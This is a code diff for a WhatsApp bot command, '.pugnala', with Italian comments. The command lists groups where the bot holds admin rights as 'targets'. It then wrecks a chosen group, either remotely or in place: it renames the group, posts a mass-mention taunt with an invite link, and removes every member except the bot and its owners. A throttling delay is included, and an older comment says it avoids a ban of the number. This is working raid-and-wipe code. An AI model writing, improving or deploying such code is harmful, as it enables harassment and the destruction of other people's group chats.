@@ -2,99 +2,103 @@ let handler = async (m, { conn, text }) => {
     const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
     if (!ownerJids.includes(m.sender)) return;
 
-    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
+    const botId = (conn.user.id.split(':')[0] + '@s.whatsapp.net').toLowerCase();
 
+    // --- LOGICA PRIVATA: LISTA BERSAGLI ---
     if (!m.isGroup) {
         if (!text) {
-            await m.reply("⏳ *Analisi profonda dei gruppi in corso...*");
-            
-            // Metodo più affidabile per ottenere la lista ID
-            let groupsRaw = await conn.groupFetchAllParticipating();
-            let groupIds = Object.keys(groupsRaw);
-            let adminGroups = [];
+            await m.reply("⏳ *Analisi in corso... controllo tutti i gruppi.*");
+            console.log("[PUGNALA] Avvio scansione gruppi per l'owner...");
 
-            for (let id of groupIds) {
+            let groups;
+            try {
+                groups = await conn.groupFetchAllParticipating();
+            } catch (e) {
+                console.error("[PUGNALA] Errore nel fetch dei gruppi:", e);
+                return m.reply("❌ Errore critico nel recupero della lista gruppi.");
+            }
+
+            let adminGroups = [];
+            let ids = Object.keys(groups);
+
+            for (let id of ids) {
                 try {
-                    // Forziamo il recupero dei metadati reali dal server
-                    let meta = await conn.groupMetadata(id);
+                    // Chiediamo direttamente al server i dati aggiornati
+                    let meta = await conn.groupMetadata(id).catch(() => null);
+                    if (!meta) continue;
+
                     let participants = meta.participants || [];
-                    
-                    // Cerchiamo il bot nella lista partecipanti di quel gruppo
-                    let bot = participants.find(p => (p.id || p.jid) === botId);
-                    
-                    // Verifichiamo se ha i permessi
+                    // Cerchiamo il bot tra i partecipanti
+                    let bot = participants.find(p => (p.id || p.jid || "").toLowerCase() === botId);
+
                     if (bot && (bot.admin === 'admin' || bot.admin === 'superadmin')) {
-                        adminGroups.push({
-                            id: id,
-                            subject: meta.subject
-                        });
+                        adminGroups.push({ id, subject: meta.subject });
                     }
-                } catch (e) {
-                    // Se fallisce (es. il bot è appena stato rimosso), ignora
-                    continue;
+                } catch (err) {
+                    continue; 
                 }
             }
 
             if (adminGroups.length === 0) {
-                return m.reply("❌ Errore: Non risulto amministratore in nessun gruppo attivo.\n\n*Nota:* Se mi hai appena dato i permessi, aspetta 10 secondi e riprova.");
+                return m.reply("❌ Non ho trovato gruppi dove sono admin.\n\n*Suggerimento:* Prova a scrivere qualcosa nel gruppo bersaglio per 'svegliare' il bot, poi riprova in privata.");
             }
 
             let txt = "🩸 *𝐋𝐈𝐒𝐓𝐀 𝐁𝐄𝐑𝐒𝐀𝐆𝐋𝐈 𝐁𝐋𝐎𝐎𝐃* 🩸\n\n";
-            txt += "Usa `.pugnala <ID>` per svuotare il gruppo da remoto.\n\n";
-            
             adminGroups.forEach((g, i) => {
-                txt += `*${i + 1}.* ${g.subject}\n` + "```" + g.id + "```\n\n";
+                txt += `*${i + 1}.* ${g.subject}\nID: \`${g.id}\`\n\n`;
             });
-
+            txt += "Copia l'ID e scrivi: `.pugnala [ID]`";
             return m.reply(txt);
         }
 
-        // Esecuzione tramite ID fornito
+        // Se l'utente ha inserito un ID (es. .pugnala 12345@g.us)
         let targetId = text.trim();
-        if (!targetId.endsWith('@g.us')) return m.reply("❌ Formato ID non valido. Deve finire con @g.us");
+        if (!targetId.endsWith('@g.us')) return m.reply("❌ L'ID deve finire con @g.us");
 
         try {
             let meta = await conn.groupMetadata(targetId);
-            await m.reply(`⚔️ *TARGET ACQUISITO:* ${meta.subject}\nAvvio procedura di eliminazione...`);
+            await m.reply(`⚔️ *TARGET:* ${meta.subject}\nEseguendo il devasto remoto...`);
             await executeDevasto(conn, targetId, meta.participants, botId, ownerJids);
-            return m.reply("✅ Devasto completato.");
+            return m.reply("✅ Operazione conclusa.");
         } catch (e) {
-            return m.reply("❌ Impossibile connettersi a questo gruppo.");
+            return m.reply("❌ Impossibile colpire questo ID. Assicurati che sia corretto.");
         }
     }
 
-    // Esecuzione immediata se usato in un gruppo
-    let groupMeta = await conn.groupMetadata(m.chat);
-    let isBotAdmin = groupMeta.participants.find(p => p.id === botId)?.admin;
-    
-    if (!isBotAdmin) return m.reply("❌ Errore: Non ho i poteri di admin qui.");
-    
-    await executeDevasto(conn, m.chat, groupMeta.participants, botId, ownerJids);
+    // --- LOGICA GRUPPO: ESECUZIONE DIRETTA ---
+    try {
+        let meta = await conn.groupMetadata(m.chat);
+        let bot = meta.participants.find(p => (p.id || p.jid || "").toLowerCase() === botId);
+        if (!bot || !bot.admin) return m.reply("❌ Non sono admin qui.");
+
+        await executeDevasto(conn, m.chat, meta.participants, botId, ownerJids);
+    } catch (e) {
+        m.reply("❌ Errore durante l'esecuzione nel gruppo.");
+    }
 };
 
 async function executeDevasto(conn, chatId, participants, botId, ownerJids) {
     try {
-        // 1. Rinominazione
-        await conn.groupUpdateSubject(chatId, `𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`);
+        // 1. Cambio Nome
+        await conn.groupUpdateSubject(chatId, `𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`).catch(() => {});
 
-        // 2. Messaggi
+        // 2. Messaggi di scherno
         let allJids = participants.map(p => p.id || p.jid);
-        await conn.sendMessage(chatId, { text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨... 𝐃𝐄𝐕𝐀𝐒𝐓𝐎." });
         await conn.sendMessage(chatId, { 
-            text: "𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥' 𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 𝐁𝐥𝐨𝐨𝐝, 𝐜𝐢 𝐯𝐞𝐝𝐢𝐚𝐦𝐨 𝐪𝐮𝐢:\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri",
+            text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐃𝐄𝐕𝐀𝐒𝐓𝐎.\n𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥' 𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 𝐁𝐥𝐨𝐨𝐝.\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri",
             mentions: allJids
         });
 
-        // 3. Filtro ed eliminazione
-        let toRemove = allJids.filter(jid => jid !== botId && !ownerJids.includes(jid));
+        // 3. Rimozione (escludendo bot e owner)
+        let toRemove = allJids.filter(jid => jid.toLowerCase() !== botId && !ownerJids.includes(jid.toLowerCase()));
 
         for (let user of toRemove) {
-            await conn.groupParticipantsUpdate(chatId, [user], 'remove');
-            // Delay per evitare il crash o il ban del numero
-            await new Promise(res => setTimeout(res, 300)); 
+            // Rimuoviamo uno a uno con un piccolo delay per non sovraccaricare la connessione
+            await conn.groupParticipantsUpdate(chatId, [user], 'remove').catch(() => {});
+            await new Promise(resolve => setTimeout(resolve, 250));
         }
     } catch (e) {
-        console.error(e);
+        console.error("Errore Devasto:", e);
     }
 }
 
